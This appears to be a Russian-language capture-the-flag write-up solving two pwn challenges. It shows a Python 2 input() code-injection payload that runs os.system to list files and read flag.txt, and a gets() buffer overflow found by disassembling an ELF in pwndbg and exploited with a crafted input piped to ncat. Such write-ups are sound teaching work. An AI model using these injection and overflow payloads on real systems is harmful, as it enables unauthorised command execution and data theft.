Безопасный калькулятор [Pwn 80]
================

Пользователю дан исходный код сервиса:
>print 'SuperCalc: '  
print (input())


Те, кто программируют на языке Python, знают опасность функции  
```input()```

– в python2 она эквивалентна функции  
```eval(raw_input())```


Следовательно, можем ее эксплуатировать.  
>$ ncat n****.ml 13376  
$ __import__(‘os’).system(‘ls’)  
$ __import__(‘os’).system(‘cat flag.txt’)



Невозможное возможно [Pwn 200]
================

У пользователя имеется исполняемый ```32bit elf``` файл, который также расположен на сервере.  
Отладим его с помощью *nix деббагера gdb.  
Первым делом посмотрим имеющиеся в программе функции:  
```pwndbg> info functions``` 

>All defined functions:  
Non-debugging symbols:  
0x0000046c  _init  
0x000004a0  strcmp@plt  
0x000004b0  gets@plt  
0x000004c0  fgets@plt  
0x000004d0  puts@plt  
0x000004e0  __libc_start_main@plt  
0x000004f0  fopen@plt  
0x00000510  _start  
0x00000550  __x86.get_pc_thunk.bx  
0x00000560  deregister_tm_clones  
0x000005a0  register_tm_clones  
0x000005f0  __do_global_dtors_aux  
0x00000640  frame_dummy  
0x00000649  __x86.get_pc_thunk.dx  
0x0000064d  func_A  
0x0000068d  main  
0x00000710  __libc_csu_init  
0x00000770  __libc_csu_fini  
0x00000774  _fini  


Посмотрим теперь ассемблерные листинги функций ```main``` и ```func_A```:   
```pwndbg> disassemble main```

>Dump of assembler code for function main:  
   0x5655568d <+0>:  lea    ecx,[esp+0x4]  
   0x56555691 <+4>:  and    esp,0xfffffff0  
   0x56555694 <+7>:  push   DWORD PTR [ecx-0x4]  
   0x56555697 <+10>:  push   ebp  
   0x56555698 <+11>:  mov    ebp,esp  
   0x5655569a <+13>:  push   ecx  
   0x5655569b <+14>:  sub    esp,0x14  
   0x5655569e <+17>:  sub    esp,0x8  
   0x565556a1 <+20>:  push   0x5655579c  
   0x565556a6 <+25>:  push   0x5655579e  
   0x565556ab <+30>:  call   0xf7e39a20 <fopen>  
   0x565556b0 <+35>:  add    esp,0x10  
   0x565556b3 <+38>:  mov    DWORD PTR [ebp-0xc],eax  
   0x565556b6 <+41>:  sub    esp,0x4  
   0x565556b9 <+44>:  push   DWORD PTR [ebp-0xc]  
   0x565556bc <+47>:  push   0x1e  
   0x565556be <+49>:  push   0x56557030  
   0x565556c3 <+54>:  call   0xf7e39770 <fgets>  
   0x565556c8 <+59>:  add    esp,0x10  
   0x565556cb <+62>:  call   0x5655564d <func_A>  
   0x565556d0 <+67>:  cmp    eax,0x5  
   0x565556d3 <+70>:  jne    0x565556e7 <main+90>  
   0x565556d5 <+72>:  sub    esp,0xc  
   0x565556d8 <+75>:  push   0x56557030  
   0x565556dd <+80>:  call   0xf7e3b2c0 <puts>  
   0x565556e2 <+85>:  add    esp,0x10  
   0x565556e5 <+88>:  jmp    0x565556f7 <main+106>  
   0x565556e7 <+90>:  sub    esp,0xc  
   0x565556ea <+93>:  push   0x565557a7  
   0x565556ef <+98>:  call   0xf7e3b2c0 <puts>  
   0x565556f4 <+103>:  add    esp,0x10  
   0x565556f7 <+106>:  mov    eax,0x0  
   0x565556fc <+111>:  mov    ecx,DWORD PTR [ebp-0x4]  
   0x565556ff <+114>:  leave    
   0x56555700 <+115>:  lea    esp,[ecx-0x4]  
   0x56555703 <+118>:  ret      
End of assembler dump.  


```pwndbg> disassemble func_A```

>Dump of assembler code for function func_A:  
   0x5655564d <+0>:  push   ebp  
   0x5655564e <+1>:  mov    ebp,esp  
   0x56555650 <+3>:  sub    esp,0x28  
   0x56555653 <+6>:  mov    DWORD PTR [ebp-0xc],0x1  
   0x5655565a <+13>:  sub    esp,0xc  
   0x5655565d <+16>:  lea    eax,[ebp-0x1c]  
   0x56555660 <+19>:  push   eax  
   0x56555661 <+20>:  call   0xf7e3aa40 <gets>  
   0x56555666 <+25>:  add    esp,0x10  
   0x56555669 <+28>:  sub    esp,0x8  
   0x5655566c <+31>:  push   0x56555790  
   0x56555671 <+36>:  lea    eax,[ebp-0x1c]  
   0x56555674 <+39>:  push   eax  
   0x56555675 <+40>:  call   0xf7f283b0  
   0x5655567a <+45>:  add    esp,0x10  
   0x5655567d <+48>:  test   eax,eax  
   0x5655567f <+50>:  jne    0x56555688 <func_A+59>  
   0x56555681 <+52>:  mov    eax,0x0  
   0x56555686 <+57>:  jmp    0x5655568b <func_A+62>  
   0x56555688 <+59>:  mov    eax,DWORD PTR [ebp-0xc]  
   0x5655568b <+62>:  leave    
   0x5655568c <+63>:  ret      
End of assembler dump.  


Разобравшись в ассемблерном коде можно определить, что в ходе ввыполнения программы происходит следующее: 

1) Считывание данных из файла ```flag.txt```
>0x565556c3 <+54>:  call   0xf7e39770 <fgets>

2) Ввод данных с клавиатуры 
>0x56555661 <+20>:  call   0xf7e3aa40 <gets>

3) Сравнение введенной строки с константной
>0x56555675 <+40>:  call   0xf7f283b0

Сама строка находится по адресу ```0x56555790```
>0x5655566c <+31>:  push   0x56555790

Можем узнать ее содержимое:  
```pwndbg> x/s 0x56555790```
>0x56555790:  "Hello World"

Если строки не равны, то выполнение программы продолжается.

4) Сравнение значения величины, которая расположена по смещению ```0x10 байт``` с величной ```0x05```  
```0x565556d0 <+67>:  cmp    eax,0x5```

Если значения равны, то выводится содержимое файла ```flag.txt```

Таким образом, можно сделать вывод, что для вывода содержимого файла ```flag.txt``` необходимо передать строку, не равную ```"Hello World"```, на 17й позиции которой расположено значение ```0x05```.

Проще всего это сделать следующим образом:

>```python -c "print 'a'*16 + '\x05'" | ncat n****.ml 13377```
